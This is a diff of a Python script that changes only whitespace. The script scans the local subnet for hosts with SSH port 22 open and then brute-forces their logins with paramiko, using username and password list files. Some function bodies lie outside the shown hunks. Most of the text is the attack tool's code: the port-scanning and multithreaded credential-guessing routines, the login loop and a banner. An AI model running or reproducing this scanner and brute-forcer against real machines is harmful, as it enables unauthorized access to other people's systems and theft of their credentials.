@@ -1,23 +1,29 @@
 #Author: Richard T Swierk
 import socket, os, sys, threading, random, paramiko
 from datetime import datetime
+
 t1=datetime.now()
+
 #The lists that are filled during the program
 isOpen=[]
 scanned=[]
 ipInfo=[]
 found=[False,'22']
+
 #Dictionary the holds all of the found logins
 foundLogin={}
+
 #These turn the text files passwords.txt and usernames.txt into lists
 usernames=[line.strip() for line in open('usernames.txt').readlines()]
 passwords=[line.strip() for line in open('passwords.txt').readlines()]
+
 #This gets the users local ip address
 s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 s.connect(("8.8.8.8", 80))
 localIP=s.getsockname()[0]
 s.close()
 localIP=localIP[:localIP.rindex('.')+1]
+
 #This function is going to first ping a random ip address that is on your network then if it is up
 #it will scan the ip address to check if it has port 22 open
 #If port 22 is open it will put it into the isOpen list. It will also put the ip address port number and hostname into
@@ -42,6 +48,7 @@ def portScan(start,end,step):
                 sys.exit()
             except socket.gaierror:
                 pass
+
 #This is the brute forcing function that runs after all the ip addresses with ssh open are found
 #This uses the passwords and usernames list made in the begining of the program
 #It will try to login to the ip address through ssh using a combination of a username and password from the lists
@@ -70,6 +77,7 @@ def bruteforce(start,end,step):
                     except:
                         pass
                     ssh.close()
+
 #This is the function to create the threads that run both the portScan and bruteforce functions.
 def threads(numThreads,function,argument):
     activeThreads=threading.activeCount()
@@ -82,8 +90,10 @@ def threads(numThreads,function,argument):
 #the program will think that it is done while the threads are still running
     while threading.activeCount()>activeThreads:
         pass
+
 #These are all the calls to the functions and where everything is printed
 print('╔╗──────────────╔╗──╔╦═══╗\n║║──────────────║╚╗╔╝║╔═╗║\n║║──╔══╦══╦╦═╗──╚╗║║╔╩╝╔╝║\n║║─╔╣╔╗║╔╗╠╣╔╗╦══╣╚╝║╔═╝╔╝\n║╚═╝║╚╝║╚╝║║║║╠══╩╗╔╝║║╚═╗\n╚═══╩══╩═╗╠╩╝╚╝───╚╝─╚═══╝\n───────╔═╝║\n───────╚══╝')
+
 threads(15,portScan,254)
 print(datetime.now()-t1)
 print("IP : open port : hostname")
@@ -91,5 +101,6 @@ for x in range(len(ipInfo)):
     print(ipInfo[x])
 print(datetime.now())
 print('Trying to brute force....')
+
 threads(2,bruteforce,len(passwords))
 print(datetime.now()-t1)
